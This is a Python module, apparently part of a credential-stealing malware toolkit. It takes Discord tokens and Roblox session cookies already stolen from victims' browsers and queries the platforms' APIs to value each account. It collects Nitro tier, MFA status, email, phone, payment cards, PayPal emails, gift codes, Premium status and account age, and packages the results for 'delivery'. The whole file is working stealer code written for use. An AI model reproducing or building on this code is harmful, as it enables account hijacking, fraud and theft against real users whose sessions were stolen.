"""Account metadata for the sessions the collectors just retrieved.

The archive already carries the credentials. What it did not carry was what those
credentials are worth: a Discord token's Nitro tier, whether MFA is on, which payment
methods are attached; a Roblox cookie's Premium status, how old the account is, what the
avatar looks like. Those are one authenticated GET each, and they turn a bare token into
an account.

Three rules shape this module, and they are rules about the run rather than about the
API:

- **Nothing here may cost a delivery.** Every call is bounded by a per-request timeout
  and a single wall-clock deadline for the whole module. Every failure is a string in a
  record. ``collect`` returns an int on every path and raises on none.
- **Nothing here may run unbidden.** A platform is enriched only when its collector is
  enabled in the config and a token was actually retrieved. There is no separate toggle:
  the same flags that decide whether to collect decide whether to look up.
- **Nothing here may invent a field.** Values come from the endpoint that owns them and
  are derived only where the derivation is arithmetic — account age from ``created``,
  Nitro tier from ``premium_type``. A missing field is absent, not zero.

The token is never written to the output. A record says which collector produced the
account and what the account is, which is everything a reader needs and nothing a
reader can log in with twice.
"""

from __future__ import annotations

import json
import time
import urllib.error
import urllib.request
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, Final, NamedTuple

from . import log, util

IDENTITY_FILE: Final[str] = "identity.json"

# The whole module gets one budget. Three endpoints on a healthy network answer in well
# under a second; a dead one burns the deadline once and the run continues without it.
_DEADLINE: Final[float] = 8.0
_PER_CALL: Final[float] = 3.0
_MAX_RESPONSE: Final[int] = 64 * 1024
_MAX_ACCOUNTS: Final[int] = 8
_MAX_CODES: Final[int] = 25
_MAX_SOURCES: Final[int] = 15

_USER_AGENT: Final[str] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

_DISCORD_API: Final[str] = "https://discord.com/api/v9"
_ROBLOX_USERS: Final[str] = "https://users.roblox.com"
_ROBLOX_PREMIUM: Final[str] = "https://premiumfeatures.roblox.com"
_ROBLOX_THUMBS: Final[str] = "https://thumbnails.roblox.com"
_ROBLOX_AUTH: Final[str] = "https://auth.roblox.com"

# premium_type is a small enum in the user object. Anything unrecognised stays absent
# rather than being labelled with a guess.
_NITRO: Final[dict[int, str]] = {0: "none", 1: "classic", 2: "boost", 3: "full"}

# What enables the enrichment of each platform. There is no ``sources.roblox`` in the
# config and adding one would be a schema bump for a toggle nobody asked for: the Roblox
# collector rides the ``browsers`` flag in the source plan, so its lookups ride it too.
# Enrichment is therefore impossible to enable without also collecting, and impossible
# to leave running on a run that collected nothing.
_FLAGS_FOR: Final[dict[str, tuple[str, ...]]] = {
    "sessions": ("sessions",),
    "roblox": ("browsers", "roblox"),
}


class _Reply(NamedTuple):
    status: int
    body: bytes
    error: str
    headers: dict[str, str]


def _request(
    url: str,
    headers: dict[str, str],
    deadline: float,
    *,
    method: str = "GET",
    data: bytes | None = None,
) -> _Reply:
    """One HTTP call that cannot raise and cannot outlive the deadline.

    A response larger than the cap is refused rather than truncated: a body that big is
    not one of these documents, and parsing half of it would put a value under the wrong
    key.
    """
    remaining = deadline - time.monotonic()
    if remaining <= 0:
        return _Reply(0, b"", "deadline", {})

    request = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(request, timeout=min(_PER_CALL, remaining)) as response:
            status = int(response.status)
            payload = response.read(_MAX_RESPONSE + 1)
            reply_headers = {key.lower(): value for key, value in response.headers.items()}
    except urllib.error.HTTPError as exc:
        try:
            payload = exc.read(_MAX_RESPONSE + 1)
        except Exception:
            payload = b""
        reply_headers = {key.lower(): value for key, value in (exc.headers or {}).items()}
        return _Reply(int(exc.code), payload, "", reply_headers)
    except urllib.error.URLError:
        return _Reply(0, b"", "unreachable", {})
    except (OSError, ValueError, TimeoutError):
        return _Reply(0, b"", "transport", {})
    except Exception:
        log.logger.debug("identity: transport raised", exc_info=True)
        return _Reply(0, b"", "transport", {})

    if len(payload) > _MAX_RESPONSE:
        return _Reply(status, b"", "oversize", reply_headers)
    return _Reply(status, payload, "", reply_headers)


def _json(reply: _Reply) -> Any:
    if not reply.body:
        return None
    try:
        return json.loads(reply.body.decode("utf-8", "replace"))
    except ValueError:
        return None


def _fault(reply: _Reply) -> str:
    """Short, stable label for a failed call. Counted, not narrated."""
    if reply.error:
        return reply.error
    if reply.status in (401, 403):
        return "unauthorized"
    if reply.status == 429:
        return "rate_limited"
    if reply.status >= 500:
        return "server_error"
    if reply.status:
        return f"status_{reply.status}"
    return "failed"


def _text(value: Any) -> str:
    return value if isinstance(value, str) else ""


def _age_days(created: str) -> int | None:
    if not created:
        return None
    stamp = created[:-1] + "+00:00" if created.endswith("Z") else created
    try:
        moment = datetime.fromisoformat(stamp)
    except ValueError:
        return None
    if moment.tzinfo is None:
        moment = moment.replace(tzinfo=UTC)
    days = (datetime.now(UTC) - moment).days
    return max(0, days)


# --- Discord ------------------------------------------------------------------


def _discord_billing(reply: _Reply, record: dict[str, Any]) -> None:
    if reply.status != 200:
        record["errors"].append(f"billing: {_fault(reply)}")
        return

    document = _json(reply)
    if not isinstance(document, list):
        record["errors"].append("billing: shape")
        return

    methods: list[dict[str, Any]] = []
    for item in document[:_MAX_SOURCES]:
        if not isinstance(item, dict):
            continue
        kind = item.get("type")
        entry: dict[str, Any] = {}
        if kind == 1:
            entry["kind"] = "card"
            brand = _text(item.get("brand"))
            if brand:
                entry["brand"] = brand
            last4 = _text(item.get("last_4"))
            if last4:
                entry["last_4"] = last4
        elif kind == 2:
            entry["kind"] = "paypal"
            email = _text(item.get("email"))
            if email:
                entry["email"] = email
        else:
            entry["kind"] = f"type_{kind}" if isinstance(kind, int) else "unknown"
        if item.get("default") is True:
            entry["default"] = True
        if item.get("invalid") is True:
            entry["invalid"] = True
        methods.append(entry)

    record["billing"] = methods


def _discord_codes(reply: _Reply, record: dict[str, Any]) -> None:
    if reply.status != 200:
        record["errors"].append(f"gifts: {_fault(reply)}")
        return

    document = _json(reply)
    if not isinstance(document, list):
        record["errors"].append("gifts: shape")
        return

    codes: list[str] = []
    for item in document:
        if not isinstance(item, dict):
            continue
        code = _text(item.get("code"))
        if code and code not in codes:
            codes.append(code)
        if len(codes) >= _MAX_CODES:
            break
    record["gift_codes"] = codes


def _discord_account(token: str, source: str, deadline: float) -> dict[str, Any] | None:
    record: dict[str, Any] = {"source": source, "errors": []}
    headers = {"Authorization": token, "User-Agent": _USER_AGENT}

    me = _request(f"{_DISCORD_API}/users/@me", headers, deadline)
    if me.status != 200:
        record["errors"].append(f"user: {_fault(me)}")
        return record

    document = _json(me)
    if not isinstance(document, dict) or not _text(document.get("id")):
        record["errors"].append("user: shape")
        return record

    for field in ("id", "username", "global_name", "discriminator", "email", "phone"):
        value = _text(document.get(field))
        if value:
            record[field] = value

    if isinstance(document.get("mfa_enabled"), bool):
        record["mfa_enabled"] = document["mfa_enabled"]
    if isinstance(document.get("verified"), bool):
        record["verified"] = document["verified"]

    premium = document.get("premium_type")
    if isinstance(premium, int):
        record["premium_type"] = premium
        tier = _NITRO.get(premium)
        if tier is not None:
            record["nitro"] = tier

    account_id = record["id"]
    avatar = _text(document.get("avatar"))
    if avatar:
        suffix = "gif" if avatar.startswith("a_") else "png"
        record["avatar_url"] = f"https://cdn.discordapp.com/avatars/{account_id}/{avatar}.{suffix}"

    billing = _request(f"{_DISCORD_API}/users/@me/billing/payment-sources", headers, deadline)
    _discord_billing(billing, record)

    codes = _request(f"{_DISCORD_API}/users/@me/outbound-promotions/codes", headers, deadline)
    _discord_codes(codes, record)

    return record


# --- Roblox -------------------------------------------------------------------


def _roblox_csrf(cookie: str, deadline: float) -> str:
    """The anti-forgery token, from the endpoint Roblox answers it on.

    A ``403`` from any authenticated endpoint carries ``x-csrf-token``; the documented
    handshake is a POST to logout, which answers the same header without logging the
    session out. One call, only when a request was refused for the want of it.
    """
    reply = _request(
        f"{_ROBLOX_AUTH}/v2/logout",
        {"Cookie": cookie, "User-Agent": _USER_AGENT},
        deadline,
        method="POST",
        data=b"",
    )
    return reply.headers.get("x-csrf-token", "")


def _roblox_get(url: str, cookie: str, deadline: float) -> tuple[Any, str]:
    """GET with one CSRF retry. Returns (document, error)."""
    reply = _request(url, {"Cookie": cookie, "User-Agent": _USER_AGENT}, deadline)
    if reply.status == 403:
        token = reply.headers.get("x-csrf-token", "")
        if not token:
            token = _roblox_csrf(cookie, deadline)
        if token:
            reply = _request(
                url,
                {
                    "Cookie": cookie,
                    "User-Agent": _USER_AGENT,
                    "X-CSRF-TOKEN": token,
                },
                deadline,
            )

    if reply.status != 200:
        return (None, _fault(reply))
    return (_json(reply), "")


def _roblox_account(cookie: str, source: str, deadline: float) -> dict[str, Any] | None:
    record: dict[str, Any] = {"source": source, "errors": []}
    header = f".ROBLOSECURITY={cookie}"

    authenticated, error = _roblox_get(
        f"{_ROBLOX_USERS}/v1/users/authenticated", header, deadline
    )
    if error:
        record["errors"].append(f"session: {error}")
        return record
    if not isinstance(authenticated, dict):
        record["errors"].append("session: shape")
        return record

    account_id = authenticated.get("id")
    if not isinstance(account_id, int):
        record["errors"].append("session: id")
        return record

    record["id"] = account_id
    for field in ("name", "displayName"):
        value = _text(authenticated.get(field))
        if value:
            record["name" if field == "name" else "display_name"] = value

    profile, error = _roblox_get(f"{_ROBLOX_USERS}/v1/users/{account_id}", header, deadline)
    if error:
        record["errors"].append(f"profile: {error}")
    elif isinstance(profile, dict):
        created = _text(profile.get("created"))
        if created:
            record["created"] = created
            age = _age_days(created)
            if age is not None:
                record["account_age_days"] = age
        if isinstance(profile.get("isBanned"), bool):
            record["is_banned"] = profile["isBanned"]
        description = _text(profile.get("description"))
        if description:
            record["description"] = description

    premium, error = _roblox_get(
        f"{_ROBLOX_PREMIUM}/v1/users/{account_id}/validate-membership", header, deadline
    )
    if error:
        record["errors"].append(f"premium: {error}")
    elif isinstance(premium, bool):
        record["premium"] = premium

    thumbs, error = _roblox_get(
        f"{_ROBLOX_THUMBS}/v1/users/avatar-headshot"
        f"?userIds={account_id}&size=420x420&format=Png",
        header,
        deadline,
    )
    if error:
        record["errors"].append(f"avatar: {error}")
    elif isinstance(thumbs, dict):
        entries = thumbs.get("data")
        if isinstance(entries, list) and entries and isinstance(entries[0], dict):
            url = _text(entries[0].get("imageUrl"))
            if url:
                record["avatar_url"] = url

    return record


# --- wiring -------------------------------------------------------------------


def _enabled(cfg: Any, platform: str) -> bool:
    """True when the collector that produced this platform's tokens is enabled."""
    sources = getattr(cfg, "sources", None)
    if sources is None:
        return False
    return any(bool(getattr(sources, flag, False)) for flag in _FLAGS_FOR[platform])


def _tokens(root: Path) -> tuple[list[tuple[str, str]], list[tuple[str, str]]]:
    """Discord tokens and Roblox cookies already on disk, with their labels.

    Read back from the collectors' own output rather than re-derived: by the time this
    runs the extraction has happened, including the app-bound unwrap, and repeating it
    would double the cost for the same string.
    """
    discord: list[tuple[str, str]] = []
    roblox: list[tuple[str, str]] = []

    records = util.read_json(root / "accounts" / "sessions.json")
    if isinstance(records, list):
        for entry in records:
            if not isinstance(entry, dict):
                continue
            token = entry.get("token")
            if not isinstance(token, str) or not token:
                continue
            if entry.get("valid") is False:
                # Discord already answered 401 for this one. Asking again spends the
                # deadline to be told the same thing.
                continue
            label = f"{_text(entry.get('browser'))}/{_text(entry.get('profile'))}".strip("/")
            discord.append((token, label or "sessions.json"))

    try:
        body = (root / "accounts" / "roblox_session.txt").read_text(
            encoding="utf-8", errors="replace"
        )
    except OSError:
        body = ""
    for index, line in enumerate(body.splitlines()):
        value = line.strip()
        if value:
            roblox.append((value, f"roblox_session.txt:{index}"))

    return (discord[:_MAX_ACCOUNTS], roblox[:_MAX_ACCOUNTS])


def collect(root: Path, cfg: Any) -> int:
    """Look up what the collected sessions are. Returns accounts resolved, never raises."""
    try:
        return _collect(root, cfg)
    except Exception:
        # The whole module is an optional extra on a run that has already succeeded.
        # Nothing it can do is worth a traceback in the delivery path.
        log.logger.debug("identity: collect failed", exc_info=True)
        return 0


def _collect(root: Path, cfg: Any) -> int:
    want_discord = _enabled(cfg, "sessions")
    want_roblox = _enabled(cfg, "roblox")
    if not want_discord and not want_roblox:
        return 0

    discord_tokens, roblox_cookies = _tokens(root)
    if not discord_tokens and not roblox_cookies:
        return 0
    if not want_discord:
        discord_tokens = []
    if not want_roblox:
        roblox_cookies = []

    deadline = time.monotonic() + _DEADLINE
    discord_records: list[dict[str, Any]] = []
    roblox_records: list[dict[str, Any]] = []
    resolved = 0

    for token, label in discord_tokens:
        record = _discord_account(token, label, deadline)
        if record is None:
            continue
        if "id" in record:
            resolved += 1
        discord_records.append(record)

    for cookie, label in roblox_cookies:
        record = _roblox_account(cookie, label, deadline)
        if record is None:
            continue
        if "id" in record:
            resolved += 1
        roblox_records.append(record)

    document = {
        "schema": 1,
        "deadline_seconds": _DEADLINE,
        "discord": discord_records,
        "roblox": roblox_records,
    }

    util.write_json(root / "accounts" / IDENTITY_FILE, document)
    log.logger.debug(
        "identity: %d discord, %d roblox, %d resolved",
        len(discord_records),
        len(roblox_records),
        resolved,
    )
    return resolved


__all__ = ["IDENTITY_FILE", "collect"]
